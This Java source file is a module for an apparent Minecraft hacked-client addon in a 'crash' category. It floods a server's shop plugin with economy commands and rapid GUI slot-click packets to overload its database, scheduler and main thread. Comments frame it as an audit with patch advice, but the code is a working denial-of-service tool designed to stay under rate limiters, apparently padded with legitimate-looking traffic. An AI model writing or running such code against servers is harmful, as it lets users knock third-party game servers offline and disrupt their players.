package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import com.example.addon.modules.antidupe.GuiState;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.screen.sync.ItemStackHash;

/**
 * AUDIT: Economy/GUI Processing Overload (transaction storm)
 *
 * A REALISTIC, non-op degradation vector that combines the two paths a shop/economy plugin
 * processes on the MAIN THREAD: a repeated economy command (buy/sell) AND rapid clicks in
 * the open shop GUI. Each transaction typically fans out to a Vault call, a database
 * write, a PlaceholderAPI parse, and event listeners — so a storm of them can exhaust the
 * plugin's DB connection pool, back up its scheduler, or floor the tick loop, without any
 * single packet tripping a rate limiter.
 *
 * <p>This is the crash-category analogue of the GUI stress work: where gui-action-rotator
 * measures one GUI handler's latency, this drives the whole transaction pipeline (command
 * + GUI) at volume to find the point where the plugin's back-end degrades.
 *
 * <p>Patch signal: make economy transactions asynchronous off the main thread with a
 * bounded queue; use a connection pool with a sane cap and fail fast when exhausted;
 * cache PlaceholderAPI results; rate-limit transactions per player.
 *
 * <p>Realism tag / severity / safe intensity / what to watch print on activate (see
 * {@link CrashProfiles}). Set the command to one your shop plugin accepts. Own server only.
 */
public class EconGuiOverload extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<String> command = sgGeneral.add(new StringSetting.Builder()
        .name("command").description("Economy transaction command to storm (no leading slash). e.g. 'sell all', 'shop buy dirt 1'.")
        .defaultValue("sell all").build());
    private final Setting<Integer> commandsPerTick = sgGeneral.add(new IntSetting.Builder()
        .name("commands-per-tick").description("Economy commands sent per tick.")
        .defaultValue(5).range(0, 200).sliderRange(0, 40).build());
    private final Setting<Integer> guiSlot = sgGeneral.add(new IntSetting.Builder()
        .name("gui-slot").description("Slot to hammer in the open shop GUI (if one is open). Use slot-overlay to find the buy/sell button.")
        .defaultValue(0).range(0, 200).sliderRange(0, 53).build());
    private final Setting<Integer> guiClicksPerTick = sgGeneral.add(new IntSetting.Builder()
        .name("gui-clicks-per-tick").description("Clicks on the GUI slot per tick (only when a container GUI is open).")
        .defaultValue(10).range(0, 200).sliderRange(0, 50).build());

    private final TestCadence cadence = new TestCadence(sgGeneral);
    private final PreStress preStress = new PreStress(sgGeneral);
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.").defaultValue(true).build());
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.").defaultValue(true).build());

    private int ticksActive = 0, packetsSent = 0;

    public EconGuiOverload() {
        super(AddonTemplate.CRASH_CATEGORY, "econ-gui-overload",
            "Storms a shop's economy command + GUI clicks together to overload the plugin's DB/scheduler/PlaceholderAPI on the main thread. Non-op degradation vector.");
    }

    @Override
    public void onActivate() {
        ticksActive = packetsSent = 0;
        cadence.onActivate(); gr.onActivate(this); preStress.onActivate(this);
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        gr.tick();
        if (!gr.firingAllowed()) return;
        if (!cadence.shouldFire()) return;

        int cmds = gr.scale(commandsPerTick.get());
        for (int i = 0; i < cmds; i++) {
            mc.player.networkHandler.sendChatCommand(command.get().trim());
            packetsSent++;
        }

        if (GuiState.containerOpen(mc) && guiClicksPerTick.get() > 0) {
            var handler = mc.player.currentScreenHandler;
            int syncId = handler.syncId, rev = handler.getRevision();
            int clicks = gr.scale(guiClicksPerTick.get());
            for (int i = 0; i < clicks; i++) {
                mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(
                    syncId, rev, (short) (int) guiSlot.get(), (byte) 0, SlotActionType.PICKUP,
                    new Int2ObjectOpenHashMap<>(), ItemStackHash.EMPTY));
                packetsSent++;
            }
        }
        gr.markFired();
        TestCadence.sendLegit(mc.player, cadence.legitRatio());
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets/commands sent.", ticksActive, packetsSent);
            gr.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
